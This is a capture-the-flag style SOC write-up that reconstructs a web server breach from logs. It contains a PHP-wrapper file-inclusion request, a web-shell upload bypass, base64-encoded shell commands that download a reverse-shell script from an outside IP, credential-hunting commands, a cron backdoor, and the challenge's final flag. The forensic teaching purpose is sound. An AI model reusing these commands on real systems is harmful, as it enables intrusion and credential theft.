---
title: Mission 2: SOC Analysis
tags:
  - SOC
  - Forensics
  - Log Analysis
  - Incident Response
---

# Mission 2: SOC Analysis

## Challenge Overview

The allied organization **Nuclear Punk** suffered a security breach. The objective of this investigation is to analyze Apache access logs alongside Linux `systemd` / `auditd` system logs to reconstruct the complete attack chain, identify the vulnerabilities exploited, uncover the attacker's infrastructure, and locate the persistence mechanism.

### Flag Format Requirement

The flag for this challenge requires aggregating four specific artifacts discovered during the investigation:

$$\text{RM\{1st\_CWE : 2nd\_CWE : Remote\_Server\_IP : Persistence\_File\_Path\}}$$

---

## Attack Timeline & Analysis

### Stage 1: Initial Reconnaissance & Local File Inclusion (CWE-98)

An initial review of the Apache web server logs reveals a series of probe requests targeting input parameters. The attacker performed source code disclosure using a PHP filter wrapper to read server-side application files.

* **Timestamp:** `2025-03-28 00:28:29.027`
* **Exploit Request:**
  ```http
  GET /?lang=php://filter/read=convert.base64-encode&page=resource=admin-page/manage HTTP/1.1
  ```
* **Analysis:** The application failed to sanitize file inclusion parameters, allowing the attacker to read local files (including `manage.php`, `index.php`, `config.php`, and `db/connect.php`) via base64 encoding.
* **1st Vulnerability (CWE):** **CWE-98** (*Improper Control of Filename for Include/Require Statement / LFI*).

---

### Stage 2: Arbitrary File Upload & Web Shell Deployment (CWE-434)

After analyzing `manage.php` via LFI, the attacker identified the file upload restriction logic and bypassed it by manipulating URL parameters (`failed=unauthorized` / `success=true`).

* **Timestamp:** `2025-03-28 00:29:17.292`
* **Upload Request:**
  ```http
  GET /admin-page/manage.php?success=true&path=upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png HTTP/1.1
  ```
* **Analysis:** The attacker uploaded a malicious script disguised as an image (`ev1L.php.png`) containing a web shell payload.
* **2nd Vulnerability (CWE):** **CWE-434** (*Unrestricted Upload of File with Dangerous Type*).

---

### Stage 3: Web Shell Execution & Command Decoding

Using the uploaded web shell, the attacker began executing system commands via the `cmd` GET parameter. Each command was Base64-encoded and piped directly to `sh`:

```
Time	clientip	response	request
00:32:37.505 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'Y2htb2QgK3ggczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh
00:32:16.735 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2dldCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkvczFtcGwzLXIzdnNoM2xsLXZwcy5zaA=='|base64+-d|sh
00:31:50.518 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'Y3VybCBodHRwOi8vMTYzLjE3Mi42Ny4yMDE6NDk5OTkv'|base64+-d|sh
00:31:40.526 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cGluZyAtYyAxIGdvb2dsZS5jb20='|base64+-d|sh
00:31:15.675 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cGluZyAtYyAxIGdvb2dsZS5jb20='|base64+-d|sh
00:31:01.683 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'cHdk'|base64+-d|sh
00:29:57.116 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo+'d2hvYW1p'|base64+-d|sh
00:29:31.653 2025-03-28	10.143.17.101	200	/admin-page/upload/68af9111db3749e2e8af39e255fd874c/ev1L.php.png?cmd=echo%20%27bHMgLWxhIA==%27|base64%20-d|sh
```

#### Decoded Command Chain

1. `ls -la` — Directory enumeration.
2. `whoami` — User identity verification (`www-data`).
3. `pwd` — Working directory check.
4. `ping -c 1 google.com` — Network egress test.
5. `curl http://163.172.67.201:49999/` — Attacker C2 server ping.
6. `wget http://163.172.67.201:49999/s1mpl3-r3vsh3ll-vps.sh` — Downloading staging reverse shell.
7. `chmod +x s1mpl3-r3vsh3ll-vps.sh` — Granting execution permissions.

* **Remote Server IP:** `163.172.67.201`

---

### Stage 4: Privilege Escalation & Audit Log Inspection

Cross-referencing web logs with `systemd` / `auditd` execution logs (`audit_type_name=EXECVE` / `detect_execve_www`) confirmed the initial reverse shell execution at `00:32:37`.

Following interactive access, the attacker performed internal enumeration:

```bash
# Searching for sensitive files
find / -type f ( -iname *passwd* -o -iname *admin* ) -exec ls -l {} ;

# Harvesting credentials
cat /tmp/.hidden/admin-credentials.txt
```

At `00:35:53`, PAM audit logs recorded a successful SSH login to the `webadm` account originating from internal IP `10.143.17.101`.

---

### Stage 5: Persistence Mechanism

After gaining `root` privileges, the attacker established a permanent backdoor on the machine:

1. Created a hidden directory: `/root/.0x00/`
2. Downloaded the persistence payload: `/root/.0x00/pwn3d-by-nullv4stati0n.sh`
3. Configured a `/usr/sbin/cron` job to execute the backdoor script automatically every minute.

* **Persistence File Path:** `/root/.0x00/pwn3d-by-nullv4stati0n.sh`

---

## Flag Construction & Validation

By combining all extracted elements according to the required format:

1. **1st CWE:** `CWE-98`
2. **2nd CWE:** `CWE-434`
3. **Remote Server IP:** `163.172.67.201`
4. **Persistence File Path:** `/root/.0x00/pwn3d-by-nullv4stati0n.sh`

**Final Flag:**
`RM{CWE-98:CWE-434:163.172.67.201:/root/.0x00/pwn3d-by-nullv4stati0n.sh}`
